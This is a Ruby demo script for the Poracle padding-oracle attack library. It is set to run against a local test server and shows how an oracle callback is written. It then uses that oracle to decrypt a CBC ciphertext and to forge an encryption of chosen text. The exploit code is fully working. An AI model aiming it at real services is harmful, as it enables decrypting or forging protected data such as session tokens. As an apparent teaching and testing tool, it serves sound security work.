# encoding: ASCII-8BIT

##
# Demo.rb
# Created: February 10, 2013
# By: Ron Bowes
#
# A demo of how to use Poracle, that works against RemoteTestServer.
##
#
#require 'httparty'
require './Poracle'
require 'httparty'
require 'singlogger'
require 'uri'

# Note: set this to DEBUG to get full full output
SingLogger.set_level_from_string(level: "DEBUG")
L = SingLogger.instance()

# 16 is good for AES and 8 for DES
BLOCKSIZE = 16


# This is the do_decrypt block - you'll have to change it depending on what your
# service is expecting (eg, by adding cookies, making a POST request, etc)
poracle = Poracle.new(BLOCKSIZE) do |data|
  # If it's as simple as sticking hex in a URL, just change this to your new path
  base_url = "http://localhost:20222/decrypt/"

  # Just append our data to the base_url
  url = base_url + data.unpack('H*').pop()

  #L.debug("Requesting '%s'..." % url)

  result = HTTParty.get(
    url,
  )

  # This is required for newer versions of Ruby sometimes
  result.parsed_response.force_encoding("ASCII-8BIT")

  # Split the response and find any line containing error / exception / fail
  # (case insensitive)
  errors = result.parsed_response.split(/\n/).select { |l| l =~ /(error|exception|fail)/i }

  #L.debug("Errors: %s" % errors.join(', '))

  # Return true if there are zero errors
  errors.empty?
end


# Grab the data from the commandline, if they passed it
data = ARGV[0]
if(data.nil?)
  # Otherwise, get the data from the server (for demo purposes)
  data = HTTParty.get("http://localhost:20222/encrypt").parsed_response

  if(data.nil?)
    L.fatal("Can't find data to decrypt! Please pass it on the commandline")
    exit
  end
end

L.info("Trying to decrypt: %s" % data)

# Convert to a binary string using pack
data = [data].pack("H*")

# Decrypt the data with the padding oracle and a NUL IV
result = poracle.decrypt(data, iv=nil)

# Note that poracle.decrypt_with_embedded_iv() can be used if the iv is
# prepended to the data (which is common)
#result = poracle.decrypt_with_embedded_iv(data)

puts("-----------------------------")
puts("Decryption result")
puts("-----------------------------")
puts result
puts("-----------------------------")
puts()

# Try and read the encryptable string from ARGV[1]
data = ARGV[1]

# If nothing was passed in, just use a line from Call of Cthluhu
if(data.nil?)
  data = "The most merciful thing in the world, I think, is the inability of the human mind to correlate all its contents."
end

puts "Trying to encrypt: %s" % data
result = poracle.encrypt(data)

puts("-----------------------------")
puts("Encrypted string")
puts("-----------------------------")
puts result.unpack('H*')
puts("-----------------------------")
puts()
